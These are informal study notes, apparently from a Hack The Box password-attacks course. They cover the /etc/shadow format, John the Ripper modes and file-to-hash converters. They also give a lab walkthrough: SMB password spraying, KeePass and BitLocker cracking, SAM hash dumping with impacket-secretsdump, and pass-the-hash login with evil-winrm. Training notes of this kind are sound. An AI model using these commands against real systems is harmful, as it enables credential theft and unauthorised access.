### linux 


```
cat etc/shadow
```

```bash
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

|               |                                   |                         |              |              |                     |                        |                      |                    |
| ------------- | --------------------------------- | ----------------------- | ------------ | ------------ | ------------------- | ---------------------- | -------------------- | ------------------ |
| htb-student:  | $y$j9T$3QSBB6CbHEu...SNIP...f8Ms: | 18955:                  | 0:           | 99999:       | 7:                  | :                      | :                    | :                  |
| `<username>`: | `<encrypted password>`:           | `<day of last change>`: | `<min age>`: | `<max age>`: | `<warning period>`: | `<inactivity period>`: | `<expiration date>`: | `<reserved field>` |
## windows logon process

![[Pasted image 20250111181352.png]]
![[Pasted image 20250111181401.png]]
  
#### Credential Storage

```powershell-session
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

## John the ripper

#### Single Crack Mode

```bash
john --format=<hash_type> <hash or hash_file>
```

#### Wordlist Mode

```shell
john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental Mode in John

```shell
john --incremental <hash_file>
```

## Cracking Files

```shell
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

# hard machine

we get user johanna

#### quick nmap

```
nmap -sV -sS -A <ip>
```

- open ports SMB, 3389(RDP), 5985 EVILWIN

### intial access

```
nxc smb <ip> -u Johanna -p <mutatedpasslist> --shares
```

## remotiung to johanna

- keepas kdbx
- keepass2john 
- crack the hash we get david and password

```
nxc smb -u david -p password --shares
```

```
smbclient -u david \\\\ip\\david
```

> here we get encrypted vhd file
- bitlocker2john > crack the bitlocker and mount the drive in windows

```
THIS WAS A FUCKING BITCH TO DO #FUCK WINDOWS
```

- We get SAM and SYSTEM 
```
impacket-secretsdump -sam SAM -system SYSTEM 
```

- We get hashes from Administraot

```
evil-winrm -u Administraotr -H <hash> 
```

### EZ CLAP